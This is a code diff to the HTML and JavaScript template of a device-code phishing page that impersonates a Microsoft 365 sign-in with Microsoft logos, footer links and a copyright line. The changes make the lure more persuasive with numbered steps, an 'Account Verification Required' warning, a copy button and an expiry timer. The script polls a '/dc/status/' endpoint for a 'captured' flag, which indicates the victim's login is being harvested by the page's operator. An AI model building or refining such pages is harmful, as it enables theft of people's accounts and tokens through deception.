@@ -31,80 +31,152 @@ const DEVICE_CODE_INTERSTITIAL_HTML = `<!DOCTYPE html>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="referrer" content="no-referrer">
-<title>Sign in to your account</title>
+<title>Sign in - Microsoft 365</title>
 <link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A8FMh//BTIP/wUyH/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyD/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyH/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyD/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AALv///C7///wu////Lv//wC7////u///8Lv///C7////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A//8AAP//AADgBwAA4AcAAOAHAADgBwAA//8AAOAHAADgBwAA4AcAAOAHAAD//wAA//8AAP//AAD//wAA//8AAA==">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-html,body{height:100%}
-body{font-family:'Segoe UI','Segoe UI Web (West European)',-apple-system,BlinkMacSystemFont,Roboto,Helvetica,Arial,sans-serif;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}
-.container{width:100%;max-width:400px;padding:40px}
-.logo{display:flex;align-items:center;gap:10px;margin-bottom:40px}
-.logo svg{flex-shrink:0}
-.logo span{font-size:18px;font-weight:600;color:#242424}
-.title{font-size:28px;font-weight:600;color:#242424;margin-bottom:12px}
-.subtitle{font-size:14px;color:#616161;margin-bottom:36px;line-height:1.5}
-.code-box{background:#f5f5f5;border-radius:8px;padding:24px;text-align:center;margin-bottom:32px}
-.code-label{font-size:11px;color:#616161;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px;font-weight:500}
-.code-value{font-size:36px;font-weight:700;letter-spacing:8px;color:#242424;font-family:'Segoe UI Mono',Consolas,monospace;min-height:50px;display:flex;align-items:center;justify-content:center}
-.code-status{font-size:12px;color:#107c10;margin-top:12px;min-height:18px;font-weight:500}
-.btn-primary{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;background:#0067b8;color:#fff;border:none;padding:14px 24px;font-size:15px;font-weight:600;cursor:pointer;border-radius:4px;transition:background .15s}
-.btn-primary:hover{background:#005a9e}
-.btn-primary:disabled{background:#b0b0b0;cursor:default}
-.btn-primary svg{flex-shrink:0}
-.separator{position:relative;text-align:center;margin:28px 0}
-.separator::before{content:'';position:absolute;top:50%;left:0;right:0;height:1px;background:#e5e5e5}
-.separator span{position:relative;background:#fff;padding:0 16px;font-size:12px;color:#8a8a8a;text-transform:uppercase;letter-spacing:1px}
-.alt-text{font-size:13px;color:#616161;text-align:center;line-height:1.6}
-.alt-text a{color:#0067b8;text-decoration:none;font-weight:500}
-.alt-text a:hover{text-decoration:underline}
-.footer{margin-top:40px;padding-top:20px;border-top:1px solid #e5e5e5;display:flex;justify-content:center;gap:20px}
-.footer a{font-size:12px;color:#616161;text-decoration:none}
-.footer a:hover{text-decoration:underline;color:#0067b8}
-.success{display:none;text-align:center}
-.success-icon{width:72px;height:72px;background:#107c10;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px}
-.success-icon svg{width:36px;height:36px;fill:#fff}
-.success-title{font-size:24px;font-weight:600;color:#242424;margin-bottom:8px}
-.success-text{font-size:14px;color:#616161}
-.spinner{display:inline-block;width:28px;height:28px;border:3px solid #e0e0e0;border-top:3px solid #0067b8;border-radius:50%;animation:spin .8s linear infinite}
+html,body{height:100%;overflow-x:hidden}
+body{font-family:'Segoe UI','Segoe UI Web (West European)',-apple-system,BlinkMacSystemFont,Roboto,Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#f5f5f5 0%,#e8e8e8 100%);display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
+.card{background:#fff;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,0.1),0 10px 20px rgba(0,0,0,0.05);width:100%;max-width:480px;overflow:hidden}
+.card-header{background:linear-gradient(90deg,#0078d4 0%,#106ebe 100%);padding:24px 32px;display:flex;align-items:center;gap:16px}
+.card-header svg{flex-shrink:0}
+.card-header-text{color:#fff}
+.card-header-title{font-size:20px;font-weight:600;margin-bottom:2px}
+.card-header-subtitle{font-size:13px;opacity:0.9}
+.card-body{padding:32px}
+.steps{margin-bottom:28px}
+.step{display:flex;gap:16px;margin-bottom:20px;align-items:flex-start}
+.step:last-child{margin-bottom:0}
+.step-num{width:28px;height:28px;background:#0078d4;color:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:600;flex-shrink:0}
+.step-content{flex:1;padding-top:3px}
+.step-title{font-size:15px;font-weight:600;color:#323130;margin-bottom:4px}
+.step-desc{font-size:13px;color:#605e5c;line-height:1.5}
+.code-container{background:#faf9f8;border:2px solid #e1dfdd;border-radius:8px;padding:20px;margin:24px 0;position:relative}
+.code-label{font-size:11px;color:#605e5c;text-transform:uppercase;letter-spacing:1.5px;font-weight:600;text-align:center;margin-bottom:12px}
+.code-wrapper{display:flex;align-items:center;justify-content:center;gap:12px}
+.code-value{font-size:38px;font-weight:700;letter-spacing:6px;color:#323130;font-family:'Segoe UI Mono',Consolas,'Courier New',monospace;min-height:52px;display:flex;align-items:center;justify-content:center;user-select:all}
+.copy-btn{background:#0078d4;color:#fff;border:none;padding:10px 16px;border-radius:4px;cursor:pointer;font-size:13px;font-weight:600;display:flex;align-items:center;gap:6px;transition:all 0.15s ease}
+.copy-btn:hover{background:#106ebe}
+.copy-btn.copied{background:#107c10}
+.copy-btn svg{width:16px;height:16px;fill:currentColor}
+.code-status{font-size:12px;color:#107c10;text-align:center;margin-top:12px;min-height:18px;font-weight:500}
+.spinner{display:inline-block;width:32px;height:32px;border:3px solid #e1dfdd;border-top:3px solid #0078d4;border-radius:50%;animation:spin 0.8s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
+.btn-primary{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;background:#0078d4;color:#fff;border:none;padding:14px 24px;font-size:15px;font-weight:600;cursor:pointer;border-radius:4px;transition:all 0.15s ease;margin-bottom:16px}
+.btn-primary:hover{background:#106ebe;transform:translateY(-1px);box-shadow:0 4px 12px rgba(0,120,212,0.3)}
+.btn-primary:disabled{background:#c8c6c4;cursor:not-allowed;transform:none;box-shadow:none}
+.btn-primary svg{flex-shrink:0}
+.warning-box{background:#fff4ce;border:1px solid #ffb900;border-radius:6px;padding:14px 16px;margin-bottom:20px;display:flex;gap:12px;align-items:flex-start}
+.warning-icon{flex-shrink:0;width:20px;height:20px;color:#d83b01}
+.warning-text{font-size:13px;color:#323130;line-height:1.5}
+.warning-text strong{color:#d83b01}
+.divider{height:1px;background:#e1dfdd;margin:24px 0}
+.alt-section{text-align:center}
+.alt-title{font-size:12px;color:#605e5c;text-transform:uppercase;letter-spacing:1px;margin-bottom:12px}
+.alt-link{display:inline-flex;align-items:center;gap:6px;color:#0078d4;text-decoration:none;font-size:14px;font-weight:500;padding:8px 16px;border:1px solid #0078d4;border-radius:4px;transition:all 0.15s ease}
+.alt-link:hover{background:#f3f9fd;text-decoration:none}
+.alt-link svg{width:14px;height:14px;fill:currentColor}
+.card-footer{background:#faf9f8;border-top:1px solid #e1dfdd;padding:16px 32px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px}
+.footer-links{display:flex;gap:20px}
+.footer-links a{font-size:12px;color:#605e5c;text-decoration:none}
+.footer-links a:hover{color:#0078d4;text-decoration:underline}
+.footer-copy{font-size:11px;color:#a19f9d}
+.success{display:none;text-align:center;padding:40px 32px}
+.success-icon{width:80px;height:80px;background:linear-gradient(135deg,#107c10 0%,#0b6a0b 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;box-shadow:0 4px 12px rgba(16,124,16,0.3)}
+.success-icon svg{width:40px;height:40px;fill:#fff}
+.success-title{font-size:24px;font-weight:600;color:#323130;margin-bottom:8px}
+.success-text{font-size:14px;color:#605e5c;margin-bottom:24px}
+.success-check{display:flex;align-items:center;justify-content:center;gap:8px;color:#107c10;font-size:14px;font-weight:500}
+.success-check svg{width:18px;height:18px;fill:currentColor}
+.timer{font-size:12px;color:#a19f9d;text-align:center;margin-top:16px}
+.timer span{font-weight:600;color:#605e5c}
+@media(max-width:520px){.card{border-radius:0;box-shadow:none}.card-header{padding:20px 24px}.card-body{padding:24px}.card-footer{padding:16px 24px}.code-value{font-size:28px;letter-spacing:4px}.step{gap:12px}.footer-links{width:100%;justify-content:center}}
 </style>
 </head>
 <body>
-<div class="container">
-<div class="logo">
-<svg width="24" height="24" viewBox="0 0 24 24"><rect width="11" height="11" fill="#f25022"/><rect x="13" width="11" height="11" fill="#7fba00"/><rect y="13" width="11" height="11" fill="#00a4ef"/><rect x="13" y="13" width="11" height="11" fill="#ffb900"/></svg>
-<span>Microsoft</span>
+<div class="card">
+<div class="card-header">
+<svg width="32" height="32" viewBox="0 0 24 24"><rect width="11" height="11" fill="#fff" fill-opacity="0.95"/><rect x="13" width="11" height="11" fill="#fff" fill-opacity="0.8"/><rect y="13" width="11" height="11" fill="#fff" fill-opacity="0.85"/><rect x="13" y="13" width="11" height="11" fill="#fff" fill-opacity="0.7"/></svg>
+<div class="card-header-text">
+<div class="card-header-title">Microsoft 365</div>
+<div class="card-header-subtitle">Account Verification Required</div>
+</div>
 </div>
 
-<div id="mainView">
-<h1 class="title">Sign in</h1>
-<p class="subtitle">Enter this code on the Microsoft sign-in page to continue</p>
+<div class="card-body" id="mainView">
+<div class="warning-box">
+<svg class="warning-icon" viewBox="0 0 20 20" fill="currentColor"><path d="M10 2L1 18h18L10 2zm0 3.5l6.5 11.5h-13L10 5.5zM9 9v4h2V9H9zm0 5v2h2v-2H9z"/></svg>
+<div class="warning-text"><strong>Important:</strong> Copy the code below before clicking "Continue to Microsoft". You will need to paste this code on the next screen.</div>
+</div>
 
-<div class="code-box">
-<div class="code-label">Code</div>
+<div class="steps">
+<div class="step">
+<div class="step-num">1</div>
+<div class="step-content">
+<div class="step-title">Copy Your Verification Code</div>
+<div class="step-desc">Click the copy button to save the code to your clipboard</div>
+</div>
+</div>
+<div class="step">
+<div class="step-num">2</div>
+<div class="step-content">
+<div class="step-title">Sign In With Microsoft</div>
+<div class="step-desc">You'll be redirected to the official Microsoft sign-in page</div>
+</div>
+</div>
+<div class="step">
+<div class="step-num">3</div>
+<div class="step-content">
+<div class="step-title">Paste & Verify</div>
+<div class="step-desc">Enter the code when prompted to complete verification</div>
+</div>
+</div>
+</div>
+
+<div class="code-container">
+<div class="code-label">Your Verification Code</div>
+<div class="code-wrapper">
 <div class="code-value" id="userCode"><span class="spinner" id="codeSpinner"></span></div>
+<button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
+<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
+<span id="copyText">Copy</span>
+</button>
+</div>
 <div class="code-status" id="codeStatus"></div>
 </div>
 
 <button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
-<svg width="20" height="20" viewBox="0 0 24 24"><rect width="11" height="11" fill="#fff" fill-opacity=".9"/><rect x="13" width="11" height="11" fill="#fff" fill-opacity=".7"/><rect y="13" width="11" height="11" fill="#fff" fill-opacity=".8"/><rect x="13" y="13" width="11" height="11" fill="#fff" fill-opacity=".6"/></svg>
-Sign in with Microsoft
+<svg width="20" height="20" viewBox="0 0 24 24"><rect width="11" height="11" fill="#fff" fill-opacity=".95"/><rect x="13" width="11" height="11" fill="#fff" fill-opacity=".75"/><rect y="13" width="11" height="11" fill="#fff" fill-opacity=".85"/><rect x="13" y="13" width="11" height="11" fill="#fff" fill-opacity=".65"/></svg>
+Continue to Microsoft
 </button>
 
-<div class="separator"><span>or manually</span></div>
+<div class="divider"></div>
 
-<p class="alt-text">Visit <a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank">microsoft.com/devicelogin</a> and enter the code above</p>
-
-<div class="footer">
-<a href="https://www.microsoft.com/en-us/servicesagreement/" target="_blank">Terms of use</a>
-<a href="https://privacy.microsoft.com/en-us/privacystatement" target="_blank">Privacy & cookies</a>
+<div class="alt-section">
+<div class="alt-title">Or verify manually</div>
+<a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank" class="alt-link">
+<svg viewBox="0 0 16 16"><path d="M8.636 3.5a.5.5 0 0 0-.5-.5H1.5A1.5 1.5 0 0 0 0 4.5v10A1.5 1.5 0 0 0 1.5 16h10a1.5 1.5 0 0 0 1.5-1.5V7.864a.5.5 0 0 0-1 0V14.5a.5.5 0 0 1-.5.5h-10a.5.5 0 0 1-.5-.5v-10a.5.5 0 0 1 .5-.5h6.636a.5.5 0 0 0 .5-.5z"/><path d="M16 .5a.5.5 0 0 0-.5-.5h-5a.5.5 0 0 0 0 1h3.793L6.146 9.146a.5.5 0 1 0 .708.708L15 1.707V5.5a.5.5 0 0 0 1 0v-5z"/></svg>
+microsoft.com/devicelogin
+</a>
 </div>
+
+<div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span> minutes</div>
 </div>
 
 <div class="success" id="successView">
 <div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
-<h2 class="success-title">You're signed in!</h2>
-<p class="success-text">Authentication successful. You can close this window.</p>
+<h2 class="success-title">Verification Complete</h2>
+<p class="success-text">Your account has been successfully verified. You may now close this window.</p>
+<div class="success-check"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>Signed in to Microsoft 365</div>
+</div>
+
+<div class="card-footer">
+<div class="footer-links">
+<a href="https://www.microsoft.com/en-us/servicesagreement/" target="_blank">Terms of Use</a>
+<a href="https://privacy.microsoft.com/en-us/privacystatement" target="_blank">Privacy & Cookies</a>
+<a href="https://www.microsoft.com/en-us/security" target="_blank">Security</a>
+</div>
+<div class="footer-copy">© Microsoft 2024</div>
 </div>
 </div>
 
@@ -114,17 +186,21 @@ var sid='{session_id}';
 var verifyUrl='{verify_url}';
 var codeReady={code_ready};
 var code='{user_code}';
+var expiresIn={expires_seconds};
 var popup=null;
 var codeEl=document.getElementById('userCode');
 var statusEl=document.getElementById('codeStatus');
 var btnEl=document.getElementById('signInBtn');
-var spinnerEl=document.getElementById('codeSpinner');
+var copyBtnEl=document.getElementById('copyBtn');
+var copyTextEl=document.getElementById('copyText');
+var timerEl=document.getElementById('timerValue');
 
 function showCode(c,v){
 code=c;
 if(v)verifyUrl=v;
 codeEl.textContent=c;
 btnEl.disabled=false;
+copyBtnEl.disabled=false;
 document.getElementById('verifyLink').href=verifyUrl;
 }
 
@@ -132,37 +208,55 @@ if(codeReady&&code){showCode(code,verifyUrl);}
 
 function copyCode(){
 if(!code)return;
-if(navigator.clipboard){navigator.clipboard.writeText(code);}
-else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);}
-statusEl.textContent='Copied to clipboard';
+if(navigator.clipboard){navigator.clipboard.writeText(code).then(function(){showCopied();});}
+else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showCopied();}
 }
+function showCopied(){
+copyBtnEl.classList.add('copied');
+copyTextEl.textContent='Copied!';
+statusEl.textContent='Code copied to clipboard — ready to paste';
+setTimeout(function(){copyBtnEl.classList.remove('copied');copyTextEl.textContent='Copy';},3000);
+}
+window.copyCode=copyCode;
 
 function openSignIn(){
 if(!code)return;
 copyCode();
-var w=500,h=680,l=(screen.width-w)/2,t=(screen.height-h)/2;
-popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes');
+var w=520,h=700,l=(screen.width-w)/2,t=(screen.height-h)/2;
+popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
 if(popup)popup.focus();
 }
 window.openSignIn=openSignIn;
+
+function updateTimer(){
+if(expiresIn<=0)return;
+expiresIn--;
+var m=Math.floor(expiresIn/60);
+var s=expiresIn%60;
+timerEl.textContent=m+':'+(s<10?'0':'')+s;
+if(expiresIn>0)setTimeout(updateTimer,1000);
+}
+if(codeReady)setTimeout(updateTimer,1000);
 
 function poll(){
 fetch('/dc/status/'+sid).then(function(r){return r.json()}).then(function(d){
 if(d.ready&&!codeReady){
 codeReady=true;
 showCode(d.user_code,d.verify_url);
+setTimeout(updateTimer,1000);
 }
 if(d.captured){
 if(popup&&!popup.closed)popup.close();
 document.getElementById('mainView').style.display='none';
 document.getElementById('successView').style.display='block';
 }else if(d.failed){
-statusEl.textContent='Failed to generate code. Refresh to retry.';
+statusEl.textContent='Session expired. Please refresh to try again.';
+statusEl.style.color='#d83b01';
 codeEl.textContent='—';
-}else if(!d.expired){setTimeout(poll,codeReady?3000:800);}
+}else if(!d.expired){setTimeout(poll,codeReady?3000:600);}
 }).catch(function(){setTimeout(poll,3000);});
 }
-setTimeout(poll,codeReady?4000:500);
+setTimeout(poll,codeReady?3000:400);
 })();
 </script>
 </body>
